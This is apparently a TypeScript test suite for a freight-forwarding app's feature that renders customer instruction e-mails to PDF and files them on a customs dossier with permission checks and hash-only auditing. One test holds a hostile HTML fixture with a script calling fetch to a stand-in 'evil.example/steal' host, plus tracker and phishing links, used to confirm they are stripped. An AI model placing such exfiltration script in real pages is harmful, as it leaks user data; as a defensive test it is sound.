/**
 * CEO-ALIGNMENT WP1-D — « Ordre de transit / instruction client », and the
 * customer's instructing e-mail filed on the dossier with its provenance.
 * ---------------------------------------------------------------------------
 * The renderer is exercised for real (bytes in, bytes out). The ingestion
 * boundary is asserted structurally on comment-stripped source: the order of
 * the authority checks, what is written, and what is NOT (no verification, no
 * address or subject in the audit row).
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, it, expect } from "vitest";
import {
  MAX_BODY_CHARS,
  bodyFor,
  htmlToText,
  normalizeText,
  renderInstructionMessage,
  utcStamp,
  wrapLine,
  type MessageRenderInput,
} from "@/lib/ec/ingest/message-render";
import { documentDoctrine } from "@/lib/documents/doctrine";
import { AuditActions } from "@/lib/audit/events";
import { validateAuditEvent } from "@/lib/audit/validate";

const read = (p: string) => readFileSync(fileURLToPath(new URL(`../${p}`, import.meta.url)), "utf8");
const code = (p: string) =>
  read(p).replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
const sql = (p: string) => read(p).replace(/--[^\n]*/g, "");
const latin1 = (b: Uint8Array) => Buffer.from(b).toString("latin1");

const RAW = "a".repeat(64);
const input = (over: Partial<MessageRenderInput> = {}): MessageRenderInput => ({
  fileNumber: "EFT-IMP-2026-00042",
  fromAddress: "achat@client.sn",
  fromName: "Service Achats",
  to: ["ops@effitrans.com"],
  cc: ["direction@effitrans.com"],
  subject: "Dédouanement conteneur MSKU1234567",
  receivedAt: "2026-10-21T09:14:33Z",
  messageIdHeader: "<abc123@client.sn>",
  rawSha256: RAW,
  textBody: "Bonjour,\nMerci de prendre en charge le dédouanement.\nCordialement",
  htmlBody: null,
  attachments: [{ filename: "facture.pdf", sizeBytes: 52_000 }],
  ...over,
});

describe("WP1-D — the rendition of a captured message", () => {
  it("is a PDF carrying the envelope, the original's SHA-256 and the text", () => {
    const pdf = latin1(renderInstructionMessage(input()));
    expect(pdf.startsWith("%PDF-")).toBe(true);
    expect(pdf).toContain("EFT-IMP-2026-00042");
    expect(pdf).toContain("achat@client.sn");
    expect(pdf).toContain(RAW);
    expect(pdf).toContain("MSKU1234567");
    expect(pdf).toContain("facture.pdf");
    expect(pdf).toContain("Merci de prendre en charge");
  });

  it("is deterministic: the same message gives the same bytes (no clock, no randomness)", () => {
    const a = renderInstructionMessage(input());
    const b = renderInstructionMessage(input());
    expect(Buffer.compare(Buffer.from(a), Buffer.from(b))).toBe(0);
    expect(code("lib/ec/ingest/message-render.ts")).not.toMatch(/Date\.now\(|new Date\(\)|Math\.random|randomUUID/);
  });

  it("renders HTML as TEXT: scripts, styles and remote resources never survive", () => {
    const hostile =
      '<html><head><title>x</title><style>body{background:url(https://evil.example/bg.png)}</style></head>' +
      '<body><p>Bonjour&nbsp;&eacute;quipe</p><script>fetch("https://evil.example/steal")</script>' +
      '<img src="https://tracker.example/pixel.gif"><a href="https://phish.example">lien</a></body></html>';
    const text = htmlToText(hostile);
    expect(text).toContain("Bonjour équipe");
    expect(text).toContain("lien");
    expect(text).not.toMatch(/evil\.example|tracker\.example|phish\.example|<|fetch\(/);
    const pdf = latin1(renderInstructionMessage(input({ textBody: null, htmlBody: hostile })));
    expect(pdf).not.toMatch(/evil\.example|tracker\.example|phish\.example/);
    expect(pdf).toContain("aucun contenu distant");
  });

  it("can fetch nothing: the renderer imports only the PDF engine and its own types", () => {
    const src = code("lib/ec/ingest/message-render.ts");
    const imports = src.match(/^import .* from "([^"]+)";$/gm) ?? [];
    expect(imports).toEqual(['import { PdfDoc, textWidth, type RGB } from "@/lib/reports/pdf";']);
    expect(src).not.toMatch(/\bfetch\(|XMLHttpRequest|node:http|node:https|require\(/);
  });

  it("states a truncation instead of applying it silently", () => {
    const long = "mot ".repeat(MAX_BODY_CHARS);
    const b = bodyFor({ textBody: long, htmlBody: null });
    expect(b.truncated).toBe(true);
    expect(b.text.length).toBe(MAX_BODY_CHARS);
    const pdf = latin1(renderInstructionMessage(input({ textBody: long })));
    expect(pdf).toContain("Texte tronqu");
  });

  it("says when the message has no text rather than printing an empty page", () => {
    const pdf = latin1(renderInstructionMessage(input({ textBody: null, htmlBody: null })));
    expect(pdf).toContain("ne contient pas de texte");
  });

  it("wraps long lines and hard-breaks a token wider than the page", () => {
    const lines = wrapLine("x".repeat(400), 200, 10);
    expect(lines.length).toBeGreaterThan(1);
    expect(lines.join("")).toBe("x".repeat(400));
    expect(wrapLine("", 200, 10)).toEqual([""]);
  });

  it("normalises line endings and removes control characters", () => {
    expect(normalizeText("a\r\nb\u0007c\n\n\n\nd")).toBe("a\nbc\n\nd");
    expect(utcStamp("2026-10-21T09:14:33Z")).toBe("2026-10-21 09:14 UTC");
  });
});

describe("WP1-D — the document type (migration #159)", () => {
  it("is optional and non-expiring: no new mandatory-document rule, no validity", () => {
    const m = sql("supabase/migrations/20261021000003_document_type_ordre_de_transit.sql");
    expect(m).toMatch(/'ORDRE_DE_TRANSIT',\s*'Ordre de transit \/ instruction client'/);
    expect(m).toMatch(/'commercial',\s*false,\s*'\{\}'/);
    expect(m).toMatch(/on conflict \(code\) do nothing/);
  });

  it("is external evidence and NOT client-safe (a rendition carries internal recipients)", () => {
    const d = documentDoctrine("ORDRE_DE_TRANSIT");
    expect(d?.category).toBe("EXTERNAL_EVIDENCE");
    expect(d?.clientSafe).toBe(false);
    expect(d?.earliestStage).toBe("open");
  });
});

describe("WP1-D — the ingestion boundary", () => {
  const actions = code("lib/ec/ingest/message-actions.ts");
  const fn = actions.slice(actions.indexOf("export async function ingestMessageToDossier"));

  it("composes the same two authorities as attachment ingestion, in order, before any read", () => {
    const order = [
      'hasPermission(permissions, "communication:inbound:read")',
      'hasPermission(permissions, "document:create")',
      "await messageProvenanceStored()",
      "isFileVisible(user.id, user.tenantId, input.fileId)",
      "loadInboundMessage(user.tenantId, input.messageId)",
    ].map((s) => fn.indexOf(s));
    for (const i of order) expect(i).toBeGreaterThan(-1);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
  });

  it("files an UPLOADED document of type ORDRE_DE_TRANSIT with message provenance — never a verified one", () => {
    const svc = code("lib/ec/ingest/message-service.ts");
    const ingest = svc.slice(svc.indexOf("export async function ingestMessage("));
    expect(svc).toContain('export const INSTRUCTION_TYPE_CODE = "ORDRE_DE_TRANSIT";');
    expect(ingest).toContain("type_code: INSTRUCTION_TYPE_CODE,");
    expect(ingest).toContain('status: "UPLOADED",');
    expect(ingest).toContain("source_message_id: message.id,");
    expect(ingest).not.toMatch(/VERIFIED|APPROVED|reviewed_by/);
    // Only a CAPTURED message can be filed, never a quarantined one.
    expect(svc).toContain('.eq("capture_status", "RECEIVED")');
    // An unreadable body is a refusal, not an empty rendition.
    expect(ingest).toContain('return { ok: false, error: "body_unreadable" };');
  });

  it("never modifies the captured message", () => {
    const svc = code("lib/ec/ingest/message-service.ts");
    expect(svc).not.toMatch(/from\("ec_inbound_message"\)[\s\S]{0,200}\.(update|delete|upsert)\(/);
  });

  it("audits once, with hashes and ids only — no address, no subject", () => {
    const audit = fn.slice(fn.indexOf("await writeAudit({"), fn.indexOf("revalidatePath("));
    expect(audit).toContain("action: AuditActions.EC_MESSAGE_INGESTED,");
    expect(audit).toContain("raw_sha256: outcome.rawSha256,");
    expect(audit).not.toMatch(/subject|from_address|fromAddress|to_addresses/);
    expect(() =>
      validateAuditEvent({
        action: AuditActions.EC_MESSAGE_INGESTED,
        actorId: "22222222-2222-4222-8222-222222222222",
        entityId: "11111111-1111-4111-8111-111111111111",
      }),
    ).not.toThrow();
  });

  it("idempotency is the database's: one document per message (partial UNIQUE index)", () => {
    const m = sql("supabase/migrations/20261021000004_document_source_message.sql");
    expect(m).toMatch(/create unique index if not exists uq_document_source_message\s+on public\.document \(source_message_id\)\s+where source_message_id is not null/);
    expect(m).toMatch(/references public\.ec_inbound_message \(id\)/);
  });

  it("the control is drawn only for holders of both authorities, once #160 is applied", () => {
    const page = code("app/mail/inbox/[id]/page.tsx");
    expect(page).toContain("const canFileMessage = canIngest && (await messageFilingAvailable());");
    expect(page).toContain("{canFileMessage ? (");
  });
});
